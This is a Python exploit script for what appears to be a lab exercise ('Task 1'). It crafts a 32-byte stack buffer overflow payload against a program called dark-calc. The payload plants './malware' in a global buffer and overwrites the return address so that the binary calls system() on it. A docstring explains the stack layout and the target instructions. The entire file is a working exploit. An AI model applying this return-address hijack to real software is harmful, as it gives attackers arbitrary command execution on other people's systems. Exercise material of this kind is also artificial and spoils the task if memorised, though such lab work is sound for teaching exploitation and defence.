#!/usr/bin/env python3
"""Task 1: Buffer overflow to execute ./malware via dark-calc.

Stack layout of input():
  expression[16] at rbp-0x10
  saved rbp     at rbp+0x00
  return addr   at rbp+0x08

strcpy copies expression (until \0) to global command_buf at 0x6030d0.
We put "./malware" in expression so command_buf = "./malware".
Then we overwrite return address to jump to eval+0x94 = 0x401a6b:
   401a6b: mov edi, 0x6030d0   # command_buf = "./malware"
   401a70: call 4017e0 <system@plt>

Payload: 9 bytes command + 1 null + 6 bytes padding + 8 bytes saved rbp + 8 bytes return address = 32 bytes
"""
import sys

payload = (
    b"./malware"              # 9 bytes -> command_buf
    + b"\x00"                 # 1 byte  -> strcpy stops here
    + b"A" * 6                # 6 bytes -> pad expression to 16
    + b"B" * 8                # 8 bytes -> overwrite saved rbp
    + b"\x6b\x1a\x40\x00\x00\x00\x00\x00"  # return addr = 0x401a6b
)

sys.stdout.buffer.write(payload)
